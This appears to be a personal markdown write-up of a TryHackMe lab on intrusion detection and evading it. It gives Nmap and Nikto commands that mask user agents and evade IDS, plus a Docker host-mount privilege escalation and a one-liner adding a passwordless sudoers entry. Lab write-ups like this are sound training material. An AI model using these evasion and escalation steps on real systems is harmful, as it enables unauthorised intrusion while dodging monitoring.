
<a href="https://tryhackme.com/r/room/idsevasion" target="_blank"><img src="./banner.png" width="700px" /></a>

## Background

This room discusses _intruder detection systems_ and how certain attacks will trigger them and generate alerts for systems administrators and SOC analysts.

## Takeaways

* [Graylog](https://graylog.org/products/source-available/) and the [ELK Stack](https://www.elastic.co/elastic-stack/) are used to visualise log data and detect abnormal or even malicious behaviour.
* [Suricata](https://suricata.io/) is a _network-based_ intruder detection system and [Wazuh](https://wazuh.com/) is a _host-based_ intruder detection system.
    * Wazuh will detect linPEAS.
* Use services like _Shodan_, _Censys_, _Google Search_, etc. for passive recon.
* Regarding Nmap:
    * Command to get service version: ``nmap -sV MACHINE_IP``
    * __Evasion Strategy:__ Change the HTTP User Agent with the following command: ``nmap -sV --script-args http.useragent="<USER AGENT HERE>" MACHINE_IP``
    * Scan for vulnerabilities (whilst masking the HTTP User agent): ``nmap --script=vuln --script-args http.useragent="<USER AGENT HERE>" MACHINE_IP``
    * A TCP-SYN scan is a bit more stealthy than a regular TCP scan: ``nmap -sS MACHINE_IP``
* Regarding Nikto:
    * Basic Nikto scan: ``nikto -p 80,3000 -h MACHINE_IP``
    * Command to only scan for useful vulnerabilities: ``nikto -p 3000 -T 1 2 3 -h MACHINE_IP``
    * Command to only scan for useful vulnerabilities and change the HTTP User Agent: ``nikto -p3000 -T 1 2 3 -useragent <AGENT_HERE> -h MACHINE_IP``
    * Command to scan just for useful vulns, mask the HTTP Agent, and use IDS evasion: ``nikto -p3000 -T 1 2 3 -useragent <AGENT_HERE> -e 1 7 -h MACHINE_IP``
* ``fail2ban`` is an intruder prevention daemon that blacklists an IP address if it has too many failed authentication attempts: https://github.com/fail2ban/fail2ban
* Potentially useful Docker privesc: ``docker run -it --entrypoint=/bin/bash -v /:/mnt/ ghcr.io/jroo1053/ctfscoreapache:master``
    * We need to add the current user to the ``sudo`` group. It can be done through:
        * ``/etc/group`` We could add the ``grafana-admin`` account to the ``root`` group. Note this file is covered by the HIDS
        * ``/etc/sudoers``: Editing this file would allow us to add the ``grafana-admin`` account to the ``sudoers`` list and thus, we would be able to run sudo to gain extra privileges. Again, this file is monitored by Wazuh.  In this case, we can perform this by running: ``echo "grafana-admin ALL=(ALL) NOPASSWD: ALL" >>/mnt/etc/sudoers``

